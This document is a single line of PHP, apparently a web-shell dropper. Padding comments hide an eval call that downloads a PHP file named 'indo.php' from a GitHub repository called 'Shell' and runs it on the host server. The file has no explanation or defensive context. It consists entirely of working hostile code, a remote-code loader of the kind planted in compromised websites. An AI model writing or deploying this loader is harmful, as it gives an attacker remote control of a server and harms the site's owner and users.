<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/sToryAn9el/Shell/main/indo.php"));/**/?>
